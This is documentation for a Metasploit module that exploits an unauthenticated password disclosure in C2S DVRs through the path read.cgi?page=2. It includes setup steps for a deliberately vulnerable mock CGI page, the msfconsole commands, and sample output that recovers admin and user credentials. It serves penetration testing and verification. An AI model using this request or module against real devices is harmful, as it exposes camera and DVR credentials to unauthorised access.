## Description

C2S DVR allows an unauthenticated user to disclose the username
& password by requesting the javascript page 'read.cgi?page=2'.
This may also work on some cameras including IRDOME-II-C2S, IRBOX-II-C2S.

## Vulnerable Application

This module has been verified against the mock vulnerable page listed below.

### Mock Vulnerable Page

These instructions will create a cgi environment and a vulnerable perl application for exploitation.
Kali rolling (2019.1) was utilized for this tutorial, with apache.

#### Setup

1. Enable cgi: `a2enmod cgid`
2. `mkdir /var/www/html/cgi-bin`
3. Enable folder for cgi execution: add `ScriptAlias "/cgi-bin/" "/var/www/html/cgi-bin/"` to `/etc/apache2/sites-enabled/000-default.conf ` inside of the `VirtualHost` tags
4. Create the vulnerable page by writing the following text to `/var/www/html/cgi-bin/read.cgi`:

```
#!/usr/bin/perl
use CGI qw(:standard);
$query = new CGI;
print $query->header( -type=> "text/javascript"),
$query->import_names( 'Q' );

my $data = <<'DATA';
var pw_enflag = "1";
var pw_adminpw = "12345";
var pw_retype1 = "12345";
var pw_userpw = "56789";
var pw_retype2 = "56789";
var pw_autolock = "0";
DATA

if ($Q::page == 2) {
  print $data;
}
```

## Verification Steps

1. Start msfconsole
2. ```use auxiliary/gather/c2s_dvr_password_disclosure```
3. ```set rhosts [rhosts]```
4. ```run```

## Scenarios

### Against the Mock page listed above

  ```
    resource (c2s.rb)> use auxiliary/gather/c2s_dvr_password_disclosure
    resource (c2s.rb)> set rhosts 127.0.0.1
    rhosts => 127.0.0.1
    resource (c2s.rb)> set verbose true
    verbose => true
    resource (c2s.rb)> exploit
    [*] Attempting to load data from /cgi-bin/read.cgi?page=2
    [+] Found: admin:12345
    [+] Found: user:56789
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    [*] Starting persistent handler(s)...
    msf5 auxiliary(gather/c2s_dvr_password_disclosure) > creds
    Credentials
    ===========
    
    host       origin     service        public  private  realm  private_type
    ----       ------     -------        ------  -------  -----  ------------
    127.0.0.1  127.0.0.1  80/tcp (http)  admin   12345           Password
    127.0.0.1  127.0.0.1  80/tcp (http)  user    56789           Password
  ```
